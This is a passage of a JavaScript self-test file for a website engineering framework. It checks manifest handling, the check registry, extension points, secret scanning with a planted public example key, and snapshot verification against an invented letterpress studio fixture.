// check:selftest-generic (G6-5, APR-JE-046; G6-6, specification 16, section 10). The engineering run against the GENERIC FIXTURE (engineering/fixtures/generic, "Quillfeather
// Letterpress", an invented three-page letterpress studio with a small builder, no baseline, no industry adapter of its own and no hero). It proves the seams of the split between the
// framework and a project: the project is read from its manifest, ids and test names derive from it, the registry reports a need the project does not meet as "not applicable", a
// project adds a check of its own through the manifest and can never remove one, a record the project does not supply fails loudly and never falls back to another project's, a
// standard is accepted with a project's overlay only inside the limits the standard sets, a known finding obeys its rules, the three offerings share one base engineering, and the
// base checks that depend on nothing project-specific pass on the fixture and catch a defect planted in it. (The whole of `npm run verify` runs on the fixture in the framework's
// own workflow.) Each case that needs the engineering bound to a project runs in a child process, because the engineering binds to its project when it is imported.
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, sep } from 'node:path';
import { spawnSync, execFileSync } from 'node:child_process';
import { pathToFileURL } from 'node:url';
import { coreDir, loadProject, project } from '../lib/project.mjs';
import { entryProblems, loadEntries, unmetNeeds } from '../lib/registry.mjs';
import { findingsProblems } from '../lib/findings.mjs';
import { overlayProblems } from '../lib/policy.mjs';
import { isMain } from '../lib/git.mjs';
import { manifestProblems, subtractionProblems } from './project.mjs';
import { buildVerificationRecord, registryDigest, validateVerification } from '../lib/verification.mjs';
import { actionProblems, callerProblems, ciContext, dependabotProblems, otherWorkflowProblems, reusableProblems, scriptProblems } from '../lib/ci-policy.mjs';
import { checkCiFile, snapshotStatus } from './ci.mjs';
import { directStyleAllowed, exceptionsFor, secretsAllowancesFor } from '../lib/ci-exceptions.mjs';
import { render } from '../tools/ci/render.mjs';
import { SHA_A, callerCases, directCases, guardCases } from '../tools/ci/cases.mjs';
import { policy } from '../lib/policy.mjs';
import { createHash } from 'node:crypto';
import { chmodSync } from 'node:fs';
import { SNAPSHOT_RECORD, blobOid, exportSnapshot, inventory, parseProfile, treeOid, verifyAgainst, verifyRepo } from '../tools/snapshot.mjs';
import { PROTECTED_SHA256, checkExtraction } from './extraction.mjs';

export const FIXTURE = join(coreDir, 'fixtures', 'generic');
const fx = loadProject(FIXTURE);
const BASE = `${pathToFileURL(coreDir).href}/`;
// the names of the project the engineering was extracted from: nothing of them may remain in the fixture
const SOURCE_PROJECT = [/jade/i, /ember/i, /-JE-/, /APR-JE/];

// Runs `body` (module code that ends with out([...problems])) with the engineering bound to `dir`; returns the problems it reported.
function inProject(dir, body) {
  const env = { ...process.env, STS_PROJECT_DIR: dir };
  const code = `const out = (a) => console.log('@@' + JSON.stringify(a)); const L = (p) => import(${JSON.stringify(BASE)} + p);\n${body}`;
  const r = spawnSync(process.execPath, ['--input-type=module', '-e', code], { env, cwd: dir, encoding: 'utf8', maxBuffer: 1 << 26, timeout: 180000 });
  const line = (r.stdout || '').split('\n').find((l) => l.startsWith('@@'));
  if (!line) return [`the child process reported nothing (exit ${r.status}): ${(r.stderr || r.stdout || '').trim().split('\n').slice(-3).join(' | ').slice(0, 300)}`];
  return JSON.parse(line.slice(2));
}

// A throw-away copy of the fixture that the cases may damage, made inside the engineering's folder because the fixture imports the engineering by relative path; it is a git
// repository of its own because the credential scan lists files through git.
const SCRATCH = join(coreDir, '.selftest');
function copyOfFixture() {
  mkdirSync(SCRATCH, { recursive: true });
  const d = mkdtempSync(join(SCRATCH, 'generic-'));
  cpSync(FIXTURE, d, { recursive: true });
  execFileSync('git', ['init', '-q'], { cwd: d });
  return d;
}
const withCopy = (fn) => { const d = copyOfFixture(); try { return fn(d); } finally { rmSync(d, { recursive: true, force: true }); try { readdirSync(SCRATCH).length || rmSync(SCRATCH, { recursive: true }); } catch { /* gone */ } } };
const editFile = (d, rel, f) => { const p = join(d, rel); writeFileSync(p, f(readFileSync(p, 'utf8'))); };
const editJson = (d, rel, f) => editFile(d, rel, (t) => { const o = JSON.parse(t); f(o); return JSON.stringify(o, null, 2); });
const editManifest = (d, f) => editJson(d, 'sts.engineering.json', f);
const filesUnder = (dir) => readdirSync(dir).flatMap((n) => { if (n === 'node_modules' || n === '.git') return []; const p = join(dir, n); return statSync(p).isDirectory() ? filesUnder(p) : [p]; });
const baseIds = () => loadEntries({ coreRoot: coreDir, manifest: fx.manifest }).map((e) => e.id);
const CI_CTX = () => ciContext({ dependencies: policy('dependencies'), environment: policy('environment'), jobs: JSON.parse(readFileSync(join(coreDir, 'ci', 'jobs.json'), 'utf8')) });
// whether the framework repository's own .github folder sits beside this engineering (not so in a consumer, where only the engineering is materialised)
const IN_FRAMEWORK = () => existsSync(join(coreDir, '..', '.github', 'workflows', fx.ci.workflow)) && fx.ci.framework !== undefined;
const PAGES = ['index.html', 'services.html', 'contact.html'];

const EXTRA_MODULE = (body) => `export const checkExtra = () => (${body});\n`;
const EXTRA_ENTRY = { id: 'check:fixture-extra', module: 'engineering/checks/extra.mjs', export: 'checkExtra', after: 'check:html', tier: 'fast', scope: 'static', reason: 'a check the fixture adds for itself; no browser', describe: 'the fixture\'s own check' };
const addExtra = (d, body) => {
  mkdirSync(join(d, 'engineering', 'checks'), { recursive: true });
  writeFileSync(join(d, 'engineering', 'checks', 'extra.mjs'), EXTRA_MODULE(body));
  editManifest(d, (m) => { m.checks.project.push(EXTRA_ENTRY); });
};
const runExtra = (d) => inProject(d, `
const { loadEntries } = await L('lib/registry.mjs'); const { runEntry } = await L('checks/runners.mjs'); const { coreDir, project } = await L('lib/project.mjs');
const list = loadEntries({ coreRoot: coreDir, manifest: project.manifest });
const e = list.find((x) => x.id === 'check:fixture-extra'); const html = list.findIndex((x) => x.id === 'check:html');
const p = [];
if (!e) p.push('the fixture check is not in the registry'); else {
  if (list.indexOf(e) !== html + 1) p.push('the fixture check is not placed after the check it names');
  const r = await runEntry(e, { fast: true });
  p.push(...r.problems.map((x) => 'the fixture check reported: ' + x), ...(r.notes.includes('ran') ? [] : ['the fixture check did not run']));
}
out(p);`);
// what a policy case reports: the message of the refusal, or nothing when the overlay was accepted
const overlayCase = (edit) => withCopy((d) => { edit(d); return inProject(d, `
const { policy } = await L('lib/policy.mjs'); const { pagesOf } = await L('lib/site.mjs'); const { projectDir } = await L('lib/git.mjs'); const names = ['privacy', 'a11y', 'lighthouse'];
const p = []; for (const n of names) { try { policy(n, { pages: pagesOf(projectDir) }); } catch (e) { p.push(e.message); } }
out(p);`); });


// ---- G6-8: the framework snapshot. A scratch "framework" repository is made from the engineering that is running (and the action beside it, if present), committed, and exported into a
// scratch consumer; the consumer is then damaged one way at a time. Works wherever the engineering runs (in a consumer the engineering is itself a snapshot).
const SNAP_SKIP = new Set(['node_modules', '.selftest', '.reports', '.git']);
function scratchFramework(dir) {
  const copy = (from, to) => cpSync(from, to, { recursive: true, filter: (src) => !SNAP_SKIP.has(src.split(sep).pop()) });
  copy(coreDir, join(dir, 'engineering'));
  const action = join(coreDir, '..', '.github', 'actions', 'engineering');
  if (existsSync(action)) copy(action, join(dir, '.github', 'actions', 'engineering'));
  execFileSync('git', ['init', '-q'], { cwd: dir });
  execFileSync('git', ['add', '-A'], { cwd: dir });
  execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.invalid', 'commit', '-q', '-m', 'framework'], { cwd: dir });
  return execFileSync('git', ['rev-parse', 'HEAD'], { cwd: dir, encoding: 'utf8' }).trim();
}
// One scratch framework and one exported consumer are made per process (they are not damaged); each case works on a copy of the consumer.
let SNAP_BASE = null;
function snapBase() {
  if (SNAP_BASE) return SNAP_BASE;
  const root = mkdtempSync(join(tmpdir(), 'sts-snap-base-'));
  process.on('exit', () => rmSync(root, { recursive: true, force: true }));
  const src = join(root, 'framework'), out = join(root, 'consumer');
  mkdirSync(src); mkdirSync(out);
  const commit = scratchFramework(src);
  execFileSync('git', ['init', '-q'], { cwd: out });
  const exported = exportSnapshot({ source: src, commit, out, protectedHashes: PROTECTED_SHA256, allowPlaceholders: true });
  return (SNAP_BASE = { src, out, commit, record: exported.record });
}
function withSnapshot(fn) {
  const b = snapBase();
  const root = mkdtempSync(join(tmpdir(), 'sts-snap-'));
  const cleanup = () => rmSync(root, { recursive: true, force: true });
  try {
    const out = join(root, 'consumer');
    cpSync(b.out, out, { recursive: true });
    const r = fn({ src: b.src, out, commit: b.commit, record: JSON.parse(JSON.stringify(b.record)), root });
    if (r && typeof r.then === 'function') return r.finally(cleanup);
    cleanup();
    return r;
  } catch (e) { cleanup(); throw e; }
}
const verifyOpts = { protectedHashes: PROTECTED_SHA256 };
const editRecord = (out, f) => { const p = join(out, SNAPSHOT_RECORD); const r = JSON.parse(readFileSync(p, 'utf8')); f(r); writeFileSync(p, JSON.stringify(r, null, 1)); };
// a snapshot case: damage the consumer, report what the verifier says (public check, optionally also the private one)
const snapCase = (damage, { against = false } = {}) => withSnapshot((c) => { damage(c); const v = verifyRepo(c.out, verifyOpts); const r = [...v.problems]; if (against && v.record) r.push(...verifyAgainst(v.record, c.src).problems); return r; });

// [name, () => problems[], expected regex | null (must find nothing)]
// ---- shared set-up of the framework compatibility cases (hashed copy, budget exceptions, style comparison)
// A child process bound to the project in `dir`; the candidate site is built into a throw-away folder that the case removes.
const COMPAT_PRE = `
const fs = await import('node:fs'); const path = await import('node:path');
const { assembleCandidate } = await L('lib/site.mjs'); const { projectDir, tempDir } = await L('lib/git.mjs');
const { buildHashed, buildManifest, stylesheetsOf, treeHash } = await L('lib/hashed.mjs'); const { refsResolve, checkAssets } = await L('checks/assets.mjs');
const p = []; const tmp = [];
const site = assembleCandidate(projectDir, 'g-compat'); tmp.push(site);
`;
// a copy of the fixture whose project also delivers a second stylesheet, extra.css, that index.html links and that names a media file
const multiCopy = (body) => withCopy((d) => {
  editManifest(d, (m) => { m.delivery.sharedFiles.push('extra.css'); });
  writeFileSync(join(d, 'extra.css'), '.extra-bg{background-image:url(media/press-hero.webp)}\n');
  return inProject(d, COMPAT_PRE + `
const idx = path.join(site, 'index.html'); fs.writeFileSync(idx, fs.readFileSync(idx, 'utf8').replace('<link rel="stylesheet" href="styles.css">', '<link rel="stylesheet" href="styles.css"><link rel="stylesheet" href="extra.css">'));
fs.writeFileSync(path.join(projectDir, 'engineering', 'assets.manifest.json'), JSON.stringify(buildManifest(site)));
` + body);
});
const BUDGET_PRE = `
const fs = await import('node:fs'); const path = await import('node:path');
const { assembleCandidate } = await L('lib/site.mjs'); const { projectDir, tempDir } = await L('lib/git.mjs'); const { checkBudgets } = await L('checks/budgets.mjs'); const { record } = await L('lib/project-records.mjs');
const p = []; const tmp = []; const site = assembleCandidate(projectDir, 'g-budget'); tmp.push(site);
const base = JSON.parse(JSON.stringify(record('budgets.json'))); const ids = ['APR-QF-001', 'APR-QF-002'];
`;
// two copies of the fixture site, A and A2 (two servers, two ports), both with a CSS image and a custom property holding a url(); variant() builds a copy of A with its stylesheet edited
const STYLE_PRE = `
const fs = await import('node:fs'); const path = await import('node:path');
const { assembleCandidate } = await L('lib/site.mjs'); const { projectDir, tempDir } = await L('lib/git.mjs'); const { buildHashed } = await L('lib/hashed.mjs'); const { runRegression } = await L('lib/regression.mjs');
const p = []; const tmp = [];
const withImage = (dir) => { const f = path.join(dir, 'styles.css'); fs.appendFileSync(f, '\\n:root{--plate:url(media/press-hero.webp)}\\nh1{background-image:url(media/press-hero.webp)}\\n'); return dir; };
const make = () => { const d = withImage(assembleCandidate(projectDir, 'g-style')); tmp.push(d); return d; };
const A = make(), A2 = make();
const variant = (edit) => { const d = make(); const f = path.join(d, 'styles.css'); fs.writeFileSync(f, edit(fs.readFileSync(f, 'utf8'))); return d; };
const styles = async (baselineRoot, candidateRoot, normalizeHashedNames = false) => {
  const reportDir = tempDir('g-style-report'); tmp.push(reportDir);
  const s = await runRegression({ baselineRoot, candidateRoot, reportDir, only: ['styles'], subset: { pages: ['index.html'], viewports: ['desktop-1440'], states: false, scenarios: /^$/ }, normalizeHashedNames, log: () => {} });
  return s.layers.styles ? s.layers.styles.problems : ['the styles layer did not run'];
};
`;
// the fixture records no approved style differences (it has no baseline); the copy gets an empty list so that the harness can run
const styleCase = (body) => withCopy((d) => { writeFileSync(join(d, 'engineering', 'approved-style-differences.json'), '{"entries": []}'); return inProject(d, STYLE_PRE + body); });

// ---- the Pause check (condition-based settling). A copy of the fixture declares a Pause control, and its assembled index.html gets a long animation, a Pause button and a script; `script` is what
// Pause does, `button` the control's markup, `css` extra rules. The case returns the Pause findings of checkMediaBrowser for that page.
const PAUSE_SCRIPT_OK = "var b=document.querySelector('.pause');b.addEventListener('click',function(){var on=b.getAttribute('aria-pressed')!=='true';b.setAttribute('aria-pressed',String(on));document.documentElement.classList.toggle('still',on)});";
const pauseCase = ({ script = PAUSE_SCRIPT_OK, button = '<button class="pause" type="button" aria-pressed="false"><span>Pause motion</span></button>', css = '' }, expectFn) => withCopy((d) => {
  editManifest(d, (m) => { m.markup.selectors.pauseControl = '.pause'; });
  return inProject(d, `
const fs = await import('node:fs'); const path = await import('node:path');
const { assembleCandidate } = await L('lib/site.mjs'); const { projectDir } = await L('lib/git.mjs'); const { checkMediaBrowser } = await L('checks/media.mjs');
const site = assembleCandidate(projectDir, 'g-pause');
const ctl = ${JSON.stringify(button)}, js = ${JSON.stringify(script)}, extra = ${JSON.stringify(css)};
fs.appendFileSync(path.join(site, 'styles.css'), '@keyframes pz{to{transform:translateX(10px)}}.lit .pulse{animation:pz 8s linear infinite}@media (prefers-reduced-motion:reduce){.lit .pulse{animation:none}}.still .pulse{animation-play-state:paused;opacity:.5;transition:opacity 1.4s}' + extra);
fs.writeFileSync(path.join(site, 'pause.js'), "var c=navigator.connection||{};if(!matchMedia('(prefers-reduced-motion:reduce)').matches&&!c.saveData&&!/2g/.test(c.effectiveType||''))document.documentElement.classList.add('lit');" + js);
const f = path.join(site, 'index.html'); fs.writeFileSync(f, fs.readFileSync(f, 'utf8').replace('</body>', '<div class="pulse">moving</div>' + ctl + '<script src="pause.js"></script></body>'));
const r = await checkMediaBrowser({ root: site, pages: ['index.html'] });
const found = r.measured.filter((x) => /:pause-|motion/.test(x.key));
fs.rmSync(site, { recursive: true, force: true });
out((${expectFn.toString()})(found, r.measured));`);
});

// ---- the software-GL notice (E-SWGL-01): the classifier on its own, the evidence reader, and the security check on a site with a WebGL canvas
const GL_NOTICE = '[.WebGL-0x3d8c00106c00]GL Driver Message (OpenGL, Performance, GL_CLOSE_PATH_NV, High): GPU stall due to ReadPixels';
const GL_CHILD = `
const { softwareGlNotice, renderingEvidence, SWGL_LIMIT } = await L('lib/engine-noise.mjs');
const p = [];
const DOC = 'http://127.0.0.1:9/index.html';
const ok = { engine: 'chromium', type: 'warning', text: ${JSON.stringify(GL_NOTICE)}, evidence: { software: true, renderer: 'SwiftShader' }, seen: 0, location: { url: DOC, lineNumber: 0, columnNumber: 0 }, documents: new Set([DOC]) };
const T = (what, over, want) => { const got = softwareGlNotice({ ...ok, ...over }); if (got !== want) p.push(what + ': classified ' + got + ', expected ' + want); };
`;
// a site with a WebGL canvas: gl.js is added to the assembled index.html; `extra` is more page script. The security check's console findings and notes come back.
const glSite = (extra) => inProject(FIXTURE, `
const fs = await import('node:fs'); const path = await import('node:path');
const { assembleCandidate } = await L('lib/site.mjs'); const { projectDir } = await L('lib/git.mjs'); const { checkSecurity } = await L('checks/security.mjs');
const site = assembleCandidate(projectDir, 'g-gl');
fs.writeFileSync(path.join(site, 'gl.js'), 'var c=document.createElement("canvas");c.width=64;c.height=64;document.body.appendChild(c);var gl=c.getContext("webgl2");var n=0;(function f(){gl.clearColor((n++%60)/60,0.2,0.3,1);gl.clear(gl.COLOR_BUFFER_BIT);if(n<120)requestAnimationFrame(f)})();' + ${JSON.stringify(extra)});
const f = path.join(site, 'index.html'); fs.writeFileSync(f, fs.readFileSync(f, 'utf8').replace('</body>', '<script src="gl.js"></script></body>'));
const r = await checkSecurity({ root: site });
fs.rmSync(site, { recursive: true, force: true });
out([JSON.stringify({ console: r.problems.filter((x) => /console messages/.test(x)), other: r.problems.filter((x) => !/console messages/.test(x)), notes: r.notes.filter((x) => /E-SWGL-01|console message/.test(x)) })]);`);
const glParse = (r) => { try { return JSON.parse(r[0]); } catch { return { console: [], other: ['unparsable result: ' + String(r[0]).slice(0, 200)], notes: [] }; } };

// ---- project-aware applicability of generic gate-2 cases (owner decision of 2026-10-18). A copy of the fixture whose opening block no longer carries the .hero class (so the hero-text case's edit is
// inert), optionally with a declaration (selftest-applicability.json) and the project's own same-named equivalent module. The reply is checkSelftestGate2({ only: <the case> }).
const NA_CASE = 'forced-colors: hero text left on the photograph';
const NA_OK_ENTRY = () => ({ case: NA_CASE, reason: 'This copy has no .hero-text, .hero h1 or .hero .eyebrow: its opening block is .lead-block, which its own same-named case in own-gate2.mjs forces onto the photograph.', approval: 'APR-QF-001', equivalent: { module: 'engineering/checks/own-gate2.mjs', export: 'own', case: NA_CASE } });
const NA_EQ_OK = "export const own = async ({ only }) => ({ problems: [], notes: ['1 targeted negative tests run', 'caught: ' + only] });\n";
const naRun = ({ rename = true, entries = null, equivalent = NA_EQ_OK, only = NA_CASE, budgets = null } = {}) => withCopy((d) => {
  if (rename) editFile(d, 'src/render.mjs', (t) => t.replace('class="hero wrap"', 'class="lead-block wrap"'));
  if (entries) writeFileSync(join(d, 'engineering', 'selftest-applicability.json'), JSON.stringify({ entries }, null, 1));
  if (equivalent !== null) { mkdirSync(join(d, 'engineering', 'checks'), { recursive: true }); writeFileSync(join(d, 'engineering', 'checks', 'own-gate2.mjs'), equivalent); }
  if (budgets) editJson(d, 'engineering/budgets.json', budgets);
  const r = inProject(d, `const { checkSelftestGate2 } = await L('checks/selftest-gate2.mjs'); const r = await checkSelftestGate2({ only: ${JSON.stringify(only)} }); out([JSON.stringify(r)]);`);
  try { return JSON.parse(r[0]); } catch { return { problems: ['unparsable: ' + String(r[0]).slice(0, 300)], notes: [] }; }
});
const JSTR = (o) => JSON.stringify(o);

const cases = [
  ['identity: the fixture is a project of its own (its id, name and every record prefix are its own)', () => {
    const want = { id: 'quillfeather-letterpress', name: 'Quillfeather Letterpress', approvalIdPrefix: 'APR-QF', demonstrationIdPrefix: 'DEMO-QF', recordIdSuffix: 'QF' };
    const got = { id: fx.id, name: fx.name, ...fx.governance };
    return Object.keys(want).filter((k) => got[k] !== want[k]).map((k) => `${k} is ${got[k]}, expected ${want[k]}`);
  }, null],
  ['isolation: the fixture tree names nothing of the project the engineering was extracted from', () => {
    const out = [];
    for (const f of filesUnder(FIXTURE)) { if (/package-lock\.json$|\.(webp|png)$/.test(f)) continue; const t = readFileSync(f, 'utf8'); for (const n of SOURCE_PROJECT) if (n.test(t)) out.push(`${f.slice(FIXTURE.length + 1)} matches ${n}`); }
    return out;
  }, null],
  // the fixture's CI workflow is the framework repository's own workflow; a project that consumes the engineering from a checkout has none of the framework's workflows beside it
  ['manifest: the fixture manifest is valid and every file it names exists', () => manifestProblems(fx).filter((x) => (existsSync(join(coreDir, '..', '.github', 'workflows', fx.ci.workflow)) || !/^ci\.(workflow|scheduled|framework\.[a-z.]+) names/.test(x)) && (IN_FRAMEWORK() || !/^paths\.repositoryRoot resolves/.test(x))), null],
  ['manifest: every attempt to remove, skip or relax a base check is refused for the fixture too', () => subtractionProblems(fx), null],
  ['registry: the fixture has every base check and none of an industry adapter\'s own', () => {
    const ids = baseIds();
    return ['check:schema', 'check:contracts'].filter((i) => ids.includes(i)).map((i) => `${i} is an industry adapter's check`).concat(['check:html', 'check:secrets', 'check:delivery', 'check:release', 'check:hosting', 'check:project', 'check:authority'].filter((i) => !ids.includes(i)).map((i) => `${i} is missing`));
  }, null],
  ['registry: what the fixture does not declare is exactly what makes checks not applicable (a baseline: the comparison with it and the regression harness)', () => {
    const na = loadEntries({ coreRoot: coreDir, manifest: fx.manifest }).filter((e) => unmetNeeds(e, fx.manifest).length).map((e) => e.id).sort().join();
    return na === 'check:baseline,check:regression' ? [] : [`not-applicable checks: ${na}`];
  }, null],
  ['runner: a check whose need the fixture does not meet reports "not applicable" and neither passes nor fails', () => inProject(FIXTURE, `
const { loadEntries } = await L('lib/registry.mjs'); const { runEntry } = await L('checks/runners.mjs'); const { coreDir, project } = await L('lib/project.mjs');
const p = [];
for (const id of ['check:baseline', 'check:regression']) {
  const e = loadEntries({ coreRoot: coreDir, manifest: project.manifest }).find((x) => x.id === id);
  const r = await runEntry(e, { fast: true });
  if (r.problems.length || !/not applicable to Quillfeather Letterpress/.test(r.notes.join())) p.push(id + ': ' + JSON.stringify(r));
}
out(p);`), null],
  ['derivation: record ids, schema ids and test host names come from the fixture manifest', () => inProject(FIXTURE, `
const m = await L('lib/project.mjs'); const p = [];
const want = { approval: 'APR-QF-003', rec: 'REL-QF-902', schema: 'quillfeather-letterpress/candidate', host: 'quillfeatherletterpress.example.test', prod: 'www.quillfeather-letterpress-fixture.com' };
const got = { approval: m.ids.approval(3), rec: m.ids.rec('REL', 902), schema: m.schemaId('candidate'), host: m.fixtureNames.exampleHost, prod: m.fixtureNames.productionHost };
for (const k of Object.keys(want)) if (want[k] !== got[k]) p.push(k + ': ' + got[k] + ' (wanted ' + want[k] + ')');
out(p);`), null],
  ['site: the page list is read from the fixture\'s own page registry', () => inProject(FIXTURE, `
const { pagesOf } = await L('lib/site.mjs'); const { projectDir } = await L('lib/git.mjs');
const got = pagesOf(projectDir).join();
out(got === ${JSON.stringify(PAGES.join())} ? [] : ['pages: ' + got]);`), null],
  ['site: the not-found page is delivered and hashed with the pages but belongs to no navigation', () => inProject(FIXTURE, `
const { deliveredPagesOf, pagesOf } = await L('lib/site.mjs'); const { projectDir } = await L('lib/git.mjs');
out(deliveredPagesOf(projectDir).join() === pagesOf(projectDir).concat(['404.html']).join() ? [] : ['delivered pages: ' + deliveredPagesOf(projectDir).join()]);`), null],
  ['markup: a selector the fixture declares is returned; one it does not declare fails loudly, naming the project and the key', () => inProject(FIXTURE, `
const { selector } = await L('lib/project.mjs'); const p = [];
if (selector('brandLink') !== 'a.brand') p.push('brandLink not returned');
try { selector('pauseControl'); p.push('an undeclared selector was returned'); } catch (e) { if (!/Quillfeather Letterpress declares no "pauseControl"/.test(e.message)) p.push('unclear message: ' + e.message); }
out(p);`), null],
  ['industry: a project that declares none gets the generic local-business adapter, never another industry\'s', () => inProject(FIXTURE, `
const { requireIndustry } = await L('lib/industry.mjs'); const a = requireIndustry();
out(a.id === 'local-business' && a.schemaType === 'LocalBusiness' && !('hasMenu' in a.structuredFields({}, () => '')) ? [] : ['adapter: ' + a.id]);`), null],
  ['builder and baseline: a project with a builder is told its command; one with no baseline is told so, with no fallback to another project\'s', () => inProject(FIXTURE, `
const m = await L('lib/project.mjs'); const g = await L('lib/git.mjs'); const p = [];
if (!Array.isArray(m.buildCommand('/x', '/y'))) p.push('no build command');
try { g.baselineRecord(); p.push('a baseline record was returned'); } catch (e) { if (!/declares no baseline/.test(e.message)) p.push(e.message); }
out(p);`), null],
  ['noise: with no hero preload declared, no console message is ever classed as the known engine warning', () => inProject(FIXTURE, `
const { engineNoise } = await L('lib/engine-noise.mjs');
out(engineNoise('firefox', 'Preload of http://x/media/hero-a.webp was ignored due to unknown "as" or "type" values, or non-matching "media" attribute') === null ? [] : ['classed as noise']);`), null],
  ['engine digest: the fixture manifest, its overlays of the standards and its evidence specification are part of what the verification record covers; its own pages and records are not', () => inProject(FIXTURE, `
const { engineFiles } = await L('lib/verification.mjs'); const f = engineFiles(); const p = [];
for (const want of [/project\\/sts\\.engineering\\.json$/, /project\\/engineering\\/a11y\\.json$/, /project\\/engineering\\/release\\/evidence-spec\\.json$/, /^standards\\/release\\/policy\\.json$/]) if (!f.some((x) => want.test(x))) p.push('not covered: ' + want);
for (const no of [/index\\.html$/, /fixtures\\//, /budgets\\.json$/, /release\\/approvals/, /\\.reports/]) if (f.some((x) => no.test(x))) p.push('covered but must not be: ' + no);
out(p);`), null],
  ['check:html: the fixture\'s pages are valid HTML and the check passes', () => inProject(FIXTURE, `
const { checkHtml } = await L('checks/html.mjs'); const { projectDir } = await L('lib/git.mjs'); const r = await checkHtml(); out(r.problems);`), null],
  ['check:secrets: the fixture tree holds no credential and the check passes', () => withCopy((d) => inProject(d, `
const { checkSecrets } = await L('checks/secrets.mjs'); out(checkSecrets({ root: process.cwd(), history: false }).problems);`)), null],
  ['check:secrets: an allowance without a reason a reviewer can accept is refused', () => withCopy((d) => { writeFileSync(join(d, 'a.md'), 'clean\n'); return inProject(d, `
const { checkSecrets } = await L('checks/secrets.mjs'); out(checkSecrets({ root: process.cwd(), history: false, allow: { entries: [{ file: 'a.md', rule: 'jwt' }] } }).problems);`); }), /needs a reason of at least 30 characters/],
  ['check:html: an image without alt text and an unclosed element planted in a fixture page are caught', () => withCopy((d) => { editFile(d, 'services.html', (t) => t.replace('</main>', '<img src="x.png"><div></main>')); return inProject(d, `
const { checkHtml } = await L('checks/html.mjs'); const r = await checkHtml({ root: process.cwd() }); out(r.problems);`); }), /services\.html:\d+:\d+ wcag\/h37/],
  ['check:secrets: a credential-shaped string planted in a fixture page is caught', () => withCopy((d) => { editFile(d, 'index.html', (t) => t.replace('</main>', `<p>${'AKIA'}${'IOSFODNN7EXAMPLE'}</p></main>`)); return inProject(d, `
const { checkSecrets } = await L('checks/secrets.mjs'); out(checkSecrets({ root: process.cwd(), history: false }).problems);`); }), /aws-access-key/],
  ['manifest: an unknown key in the fixture manifest is refused by the loader', () => withCopy((d) => { editManifest(d, (m) => { m.skipChecks = ['check:html']; }); return inProject(d, `
await L('lib/project.mjs').then(() => out([])).catch((e) => out([e.message]));`); }), /not a valid project manifest/],
  ['manifest: a file the fixture manifest names but the fixture lacks is reported', () => withCopy((d) => { rmSync(join(d, 'config', 'site.json')); return inProject(d, `
const { project } = await L('lib/project.mjs'); const { manifestProblems } = await L('checks/project.mjs'); out(manifestProblems(project));`); }), /config\/site\.json.*does not exist/],
  ['manifest: a missing approvals log is reported', () => withCopy((d) => { editManifest(d, (m) => { m.governance.approvalsLog = 'engineering/fixtures/generic/NO-SUCH-LOG.md'; }); return inProject(d, `
const { project } = await L('lib/project.mjs'); const { manifestProblems } = await L('checks/project.mjs'); out(manifestProblems(project));`); }), /approvalsLog.*does not exist/],
  ['manifest: a design value hidden in the manifest\'s text is refused (a colour, a font size, a duration)', () => withCopy((d) => { editManifest(d, (m) => { m.project.summary = 'A studio with a #c0392b accent, 18px Playfair Display text and a 400ms ease-out reveal.'; }); return inProject(d, `
const { project } = await L('lib/project.mjs'); const { manifestProblems } = await L('checks/project.mjs'); out(manifestProblems(project));`); }), /contains a colour/],
  ['manifest: a build command that runs a script the project does not have, in any language, is refused', () => withCopy((d) => { editManifest(d, (m) => { m.delivery.build = { command: ['bash', 'tools/make-site.sh', '{out}'] }; }); return inProject(d, `
const { project } = await L('lib/project.mjs'); const { manifestProblems } = await L('checks/project.mjs'); out(manifestProblems(project));`); }), /the build script tools\/make-site\.sh does not exist/],
  ['manifest: a source root that is neither a folder nor a script is refused', () => withCopy((d) => { editManifest(d, (m) => { m.delivery.sourceRoots = ['README.md']; }); return inProject(d, `
const { project } = await L('lib/project.mjs'); const { manifestProblems } = await L('checks/project.mjs'); out(manifestProblems(project));`); }), /neither a folder nor a script/],
  ['manifest: an asset folder the base engineering does not judge is refused', () => withCopy((d) => { editManifest(d, (m) => { m.delivery.assetFolders.push('downloads'); }); return inProject(d, `
await L('lib/project.mjs').then(() => out([])).catch((e) => out([e.message]));`); }), /not a valid project manifest/],
  ['extension point: a check the fixture adds through its own manifest is placed where it asks and is run from the fixture', () => withCopy((d) => { addExtra(d, "({ problems: [], notes: ['ran'] })"); return runExtra(d); }), null],
  ['extension point: a failing check the fixture adds is reported as a failure', () => withCopy((d) => { addExtra(d, "({ problems: ['planted'], notes: ['ran'] })"); return runExtra(d); }), /fixture check reported: planted/],
  ['extension point: a fixture check placed after a check that does not exist is refused when the registry is built', () => withCopy((d) => { addExtra(d, "({ problems: [], notes: [] })"); editManifest(d, (m) => { m.checks.project[0].after = 'check:nothing'; }); return inProject(d, `
const { loadEntries } = await L('lib/registry.mjs'); const { coreDir, project } = await L('lib/project.mjs');
try { loadEntries({ coreRoot: coreDir, manifest: project.manifest }); out([]); } catch (e) { out([e.message]); }`); }), /which is not in the registry/],
  ['registry: two checks that follow the same check keep the order they were declared in, and a check that follows nothing is refused', () => {
    const mk = (id, after) => ({ id, module: 'a.mjs', export: 'a', tier: 'fast', after, scope: 'static', reason: 'a synthetic check for the order case; no browser', describe: 'x' });
    const m = { ...fx.manifest, checks: { project: [mk('check:one', 'check:html'), mk('check:two', 'check:html')] } };
    const ids = loadEntries({ coreRoot: coreDir, manifest: m }).map((e) => e.id);
    const at = ids.indexOf('check:html'), p = [];
    if (ids[at + 1] !== 'check:one' || ids[at + 2] !== 'check:two') p.push(`order after check:html: ${ids.slice(at, at + 3).join(', ')}`);
    try { loadEntries({ coreRoot: coreDir, manifest: { ...fx.manifest, checks: { project: [mk('check:early', null)] } } }); p.push('a check that follows nothing was accepted'); } catch (e) { if (!/must name the check it follows/.test(e.message)) p.push(e.message); }
    return p;
  }, null],
  ['registry: only the framework can make a check waivable; a project\'s or an adapter\'s entry that claims it is refused', () => entryProblems({ id: 'check:x', owner: 'project', tier: 'fast', scope: 'static', reason: 'a synthetic check for the waivable case; no browser', describe: 'x', waivable: true }, 'project'), /only a framework check can be waivable/],
  ['records: a record the fixture does not supply fails the check that needs it, naming the record and the project, and falls back to nothing', () => withCopy((d) => { rmSync(join(d, 'engineering', 'budgets.json')); return inProject(d, `
const { loadEntries } = await L('lib/registry.mjs'); const { runEntry } = await L('checks/runners.mjs'); const { coreDir, project } = await L('lib/project.mjs');
